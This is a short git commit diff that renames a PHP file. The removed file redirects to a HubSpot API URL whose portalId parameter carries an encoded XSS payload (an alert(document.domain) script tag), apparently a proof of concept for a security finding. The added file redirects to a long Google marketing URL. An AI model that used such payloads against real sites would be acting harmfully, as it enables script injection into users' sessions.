a7d2e1da81ce052b43725873d7cb243bb4b3b31d
missoum1307 <missoum1307@users.noreply.github.com>
2018-02-18 02:07:35 +0100

    Update and rename hubspot.php to phpopen.php

--- hubspot.php
+++
@@ -1,5 +0,0 @@
-
-<?php 
-header("Location: https://app.hubspot.com/content/api/v4/tools-menu/has-permission?portalId=q%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E")
-
-?>
---
+++ phpopen.php
@@ -0,0 +1,5 @@
+
+<?php 
+header("Location: https://www.google.com/appserve/mkt/p/AFOm0uGu7_OIQYrQpUIwAf-uDIG8wI8FEqGs6QzwHWZwd2K-b6-3kECSnEppkUHdgW1a9ydGDpRp-Z3hj24RyKmNVdvnIxe62VDFqEeRW6nLJA")
+
+?>
